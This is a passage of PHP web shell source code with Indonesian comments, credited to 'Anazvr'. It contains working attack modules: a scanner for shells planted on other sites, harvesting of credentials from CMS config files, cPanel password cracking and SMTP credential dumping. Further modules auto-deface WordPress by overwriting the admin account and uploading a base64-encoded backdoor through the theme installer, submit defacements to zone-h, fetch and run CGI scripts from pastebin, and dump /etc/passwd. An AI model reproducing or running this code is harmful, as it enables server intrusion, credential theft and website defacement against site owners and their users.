"tmp/cgi.pl","downloads/dom.php","templates/ja-helio-farsi/index.php","webadmin.html","admins.php",
"/wp-content/plugins/count-per-day/js/yc/d00.php", "admins/","admins.asp","admins.php","wp.zip","wso2.5.1","pasir.php","pasir2.php","up.php","cok.php","newfile.php","upl.php",".php","a.php","crot.php","kontol.php","hmei7.php","jembut.php","memek.php","tai.php","rabit.php","indoxploit.php","a.php","hemb.php","hack.php","galau.php","HsH.php","indoXploit.php","asu.php","wso.php","lol.php","idx.php","rabbit.php","1n73ction.php","k.php","mailer.php","mail.php","temp.php","c.php","d.php","IDB.php","indo.php","indonesia.php","semvak.php","ndasmu.php","cox.php","as.php","ad.php","aa.php","file.php","peju.php","asd.php","configs.php","ass.php","z.php");
foreach ($shells as $shell){
$headers = get_headers("$url$shell"); // 
if (eregi('200', $headers[0])) {
echo "<a href='$url$shell'>$url$shell</a> <span class='found'>Done :D</span><br /><br/><br/>"; // 
$dz = fopen('shells.txt', 'a+');
$suck = "$url$shell";
fwrite($dz, $suck."\n");
}
}
echo "Shell [ <a href='./shells.txt' target='_blank'>shells.txt</a> ]</span>";
}
	
}
 elseif($_GET['do'] == 'cpanel') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						$i++;
						echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>Nemu ".$i." Cpanel by <font color=lime>Anazvr</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/client/", $ambil)) {
					preg_match("/password=(.*)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
} elseif($_GET['do'] == 'smtp') {
	echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
	function scj($dir) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			if(!is_file("$dir/$dirb")) continue;
			$ambil = file_get_contents("$dir/$dirb");
			$ambil = str_replace("$", "", $ambil);
			if(preg_match("/JConfig|joomla/", $ambil)) {
				$smtp_host = ambilkata($ambil,"smtphost = '","'");
				$smtp_auth = ambilkata($ambil,"smtpauth = '","'");
				$smtp_user = ambilkata($ambil,"smtpuser = '","'");
				$smtp_pass = ambilkata($ambil,"smtppass = '","'");
				$smtp_port = ambilkata($ambil,"smtpport = '","'");
				$smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
				echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
				echo "SMTP port: <font color=lime>$smtp_port</font><br>";
				echo "SMTP user: <font color=lime>$smtp_user</font><br>";
				echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
				echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
				echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
			}
		}
	}
	$smpt_hunter = scj($dir);
	echo $smpt_hunter;
} elseif($_GET['do'] == 'auto_wp') {
	if($_POST['hajar']) {
		$title = htmlspecialchars($_POST['new_title']);
		$pn_title = str_replace(" ", "-", $title);
		if($_POST['cek_edit'] == "Y") {
			$script = $_POST['edit_content'];
		} else {
			$script = $title;
		}
		$conf = $_POST['config_dir'];
		$scan_conf = scandir($conf);
		foreach($scan_conf as $file_conf) {
			if(!is_file("$conf/$file_conf")) continue;
			$config = file_get_contents("$conf/$file_conf");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."posts";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				$update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
				$update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
				echo "<div style='margin: 5px auto;'>";
				if($target == '') {
					echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
				} else {
					echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
				}
				if(!$update OR !$conn OR !$db) {
					echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
				} else {
					echo "<font color=lime>sukses di ganti.</font><br>";
				}
				echo "</div>";
				mysql_close($conn);
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit Title+Content WordPress</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked By Anazvr' placeholder='New Title'><br><br>
		Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
		<span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
		<textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 450px;'><br>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
} elseif($_GET['do'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value'Anazvr'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
}elseif($_GET['do'] == 'lcf') {
	mkdir('LCF',0755);
chdir('LCF');
$kokdosya = ".htaccess";
$dosya_adi = "$kokdosya";
$dosya = fopen ($dosya_adi , 'w') or die ("Error mas broo!!!");
$metin = "OPTIONS Indexes Includes ExecCGI FollowSymLinks	\n AddType application/x-httpd-cgi .pl \n AddHandler cgi-script .pl \n AddHandler cgi-script .pl
\n \n Options \n DirectoryIndex seees.html \n RemoveHandler .php \n AddType application/octet-stream .php"; 
fwrite ( $dosya , $metin ) ;
 fclose ($dosya);
$file = fopen("lcf.pl","w+");
$write = fwrite ($file ,file_get_contents("http://pastebin.com/raw/26jAL0sz"));
fclose($file);
chmod("lcf.pl",0755);
echo "<iframe src=LCF/lcf.pl width=97% height=100% frameborder=0></iframe>";
}
 elseif($_GET['do'] == 'cgi') {
	$cgi_dir = mkdir('idx_cgi', 0755);
	$file_cgi = "idx_cgi/cgi.izo";
	$isi_htcgi = "AddHandler cgi-script .izo";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = file_get_contents("http://pastebin.com/raw.php?i=XTUFfJLg");
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, $cgi_script);
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
	echo "<iframe src='idx_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
} elseif($_GET['do'] == 'fake_root') {
	ob_start();
	function reverse($url) {
		$ch = curl_init("http://domains.yougetsignal.com/domains.php");
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
			  curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
			  curl_setopt($ch, CURLOPT_HEADER, 0);
			  curl_setopt($ch, CURLOPT_POST, 1);
		$resp = curl_exec($ch);
		$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
		$array = explode(",,", $resp);
		unset($array[0]);
		foreach($array as $lnk) {
			$lnk = "http://$lnk";
			$lnk = str_replace(",", "", $lnk);
			echo $lnk."\n";
			ob_flush();
			flush();
		}
			  curl_close($ch);
	}
	function cek($url) {
		$ch = curl_init($url);
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
			  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		$resp = curl_exec($ch);
		return $resp;
	}
	$cwd = getcwd();
	$ambil_user = explode("/", $cwd);
	$user = $ambil_user[2];
	if($_POST['reverse']) {
		$site = explode("\r\n", $_POST['url']);
		$file = $_POST['file'];
		foreach($site as $url) {
			$cek = cek("$url/~$user/$file");
			if(preg_match("/hacked/i", $cek)) {
				echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
		User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
		Domain: <br>
		<textarea style='width: 450px; height: 250px;' name='url'>";
		reverse($_SERVER['HTTP_HOST']);
		echo "</textarea><br>
		<input type='submit' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
		</form><br>
		NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
	}
} elseif($_GET['do'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
}elseif($_GET['do'] == 'passwbypass') {
	echo '<center>Bypass etc/passw With:<br>
<table style="width:50%">
  <tr>
    <td><form method="post"><input type="submit" value="System Function" name="syst"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passth"></form></td>
    <td><form method="post"><input type="submit" value="Exec Function" name="ex"></form></td>	
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shex"></form></td>		
    <td><form method="post"><input type="submit" value="Posix_getpwuid Function" name="melex"></form></td>
</tr></table>Bypass User With : <table style="width:50%">
<tr>
    <td><form method="post"><input type="submit" value="Awk Program" name="awkuser"></form></td>
    <td><form method="post"><input type="submit" value="System Function" name="systuser"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passthuser"></form></td>	
    <td><form method="post"><input type="submit" value="Exec Function" name="exuser"></form></td>		
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shexuser"></form></td>
</tr>
</table><br>';


if ($_POST['awkuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
echo "</textarea><br>";
}
if ($_POST['systuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo system("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['passthuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo passthru("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['exuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo exec("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['shexuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("ls /var/mail");
echo "</textarea><br>";
}
if($_POST['syst'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo system("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['passth'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo passthru("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['ex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['shex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo shell_exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
echo '<center>';
if($_POST['melex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
for($uid=0;$uid<60000;$uid++){ 
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}
}
echo"</textarea><br><br>";
}
//

//



###########################################################################
} elseif($_GET['act'] == 'chmod') {
    echo "<tr><td>Current File : ";
    echo base64_decode($_GET['filesrc']);
    echo '</tr></td></table><br />';
    echo('<pre>'.htmlspecialchars(file_get_contents(base64_decode($_GET['filesrc']))).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['path'],$_POST['perm'])){
                echo '<font color="green">Change Permission Done.</font><br />';
            }else{
                echo '<font color="red">Change Permission Error.</font><br />';
            }
        }
        echo '<form method="POST">
        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Done" />
        </form>';
}

#########################################################################


} elseif($_GET['do'] == 'auto_dwp2') {
	if($_POST['auto_deface_wp']) {
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		function lohgin($cek, $web, $userr, $pass, $wp_submit) {
    		$post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
			$ch = curl_init($cek);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				  curl_setopt($ch, CURLOPT_POST, 1);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
				  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$link = explode("\r\n", $_POST['link']);
		$script = htmlspecialchars($_POST['script']);
		$user = "anazvr";
		$pass = "anazvr";
		$passx = md5($pass);
		foreach($link as $dir_config) {
			$config = anucurl($dir_config);
			$dbhost = ambilkata($config,"DB_HOST', '","'");
			$dbuser = ambilkata($config,"DB_USER', '","'");
			$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
			$dbname = ambilkata($config,"DB_NAME', '","'");
			$dbprefix = ambilkata($config,"table_prefix  = '","'");
			$prefix = $dbprefix."users";
			$option = $dbprefix."options";
			$conn = mysql_connect($dbhost,$dbuser,$dbpass);
			$db = mysql_select_db($dbname);
			$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
			$result = mysql_fetch_array($q);
			$id = $result[ID];
			$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
			$result2 = mysql_fetch_array($q2);
			$target = $result2[option_value];
			if($target == '') {					
				echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
			} else {
				echo "[+] $target <br>";
			}
			$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
			if(!$conn OR !$db OR !$update) {
				echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
				mysql_close($conn);
			} else {
				$site = "$target/wp-login.php";
				$site2 = "$target/wp-admin/theme-install.php?upload";
				$b1 = anucurl($site2);
				$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
				$b = lohgin($site, $site2, $user, $pass, $wp_sub);
				$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
				$upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
				$www = "m.php";
				$fp5 = fopen($www,"w");
				fputs($fp5,$upload3);
				$post2 = array(
						"_wpnonce" => "$anu2",
						"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
						"themezip" => "@$www",
						"install-theme-submit" => "Install Now",
						);
				$ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
					  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
					  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
					  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
					  curl_setopt($ch, CURLOPT_POST, 1);
					  curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
					  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
					  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
				$data3 = curl_exec($ch);
					  curl_close($ch);
				$y = date("Y");
				$m = date("m");
				$namafile = "id.php";
				$fpi = fopen($namafile,"w");
				fputs($fpi,$script);
				$ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
					   curl_setopt($ch6, CURLOPT_POST, true);
					   curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
					   curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
					   curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
	       		  	   curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
	       		 	   curl_setopt($ch6, CURLOPT_COOKIESESSION,true);
				$postResult = curl_exec($ch6);
					   curl_close($ch6);
				$as = "$target/k.php";
				$bs = anucurl($as);
				if(preg_match("#$script#is", $bs)) {
                   	echo "[+] <font color='lime'>berhasil mepes...</font><br>";
                   	echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
                    } else {
                    echo "[-] <font color='red'>gagal mepes...</font><br>";
                    echo "[!!] coba aja manual: <br>";
                    echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                    echo "[+] username: <font color=lime>$user</font><br>";
                    echo "[+] password: <font color=lime>$pass</font><br><br>";     
                    }
            	mysql_close($conn);
			}
		}
	} else {
		echo "<center><h1>WordPress Auto Deface V.2</h1>
		<form method='post'>
		Link Config: <br>
		<textarea name='link' placeholder='http://target.com/idx_config/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
		<input type='text' name='script' height='10' size='50' placeholder='Hacked By 0x1999' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form></center>";
	}
} elseif($_GET['act'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$act = "<font color=red>permission denied</font>";
		} else {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'rename_dir') {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "<form method='post'>
	<input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='dir_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete_dir') {
	function Delete($path)
{
    if (is_dir($path) === true)
    {
        $files = array_diff(scandir($path), array('.', '..'));
        foreach ($files as $file)
        {
            Delete(realpath($path) . '/' . $file);
        }
        return rmdir($path);
    }
    else if (is_file($path) === true)
    {
        return unlink($path);
    }
    return false;
}
	$delete_dir = Delete($dir);
	if($delete_dir) {
		$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
	} else {
		$act = "<font color=red>could not remove ".basename($dir)."</font>";
	}
	echo $act;
} elseif($_GET['act'] == 'view') {
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=lime>Saved!</font>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 500px;'>
	</form>";
} elseif($_GET['act'] == 'rename') {
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete') {
	$delete = unlink($_GET['file']);
	if($delete) {
		$act = "<script>window.location='?dir=".$dir."';</script>";
	} else {
		$act = "<font color=red>permission denied</font>";
	}
	echo $act;
}else {
	if(is_dir($dir) == true) {
		echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
		<tr>
		<th class="th_home"><center>Name</center></th>
		<th class="th_home"><center>Type</center></th>
		<th class="th_home"><center>Size</center></th>
		<th class="th_home"><center>Last Modified</center></th>
		<th class="th_home"><center>Permission</center></th>
		<th class="th_home"><center>Action</center></th>
		</tr>';
		$scandir = scandir($dir);
		foreach($scandir as $dirx) {
			$dtype = filetype("$dir/$dirx");
			$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
 			if(!is_dir("$dir/$dirx")) continue;
 			if($dirx === '..') {
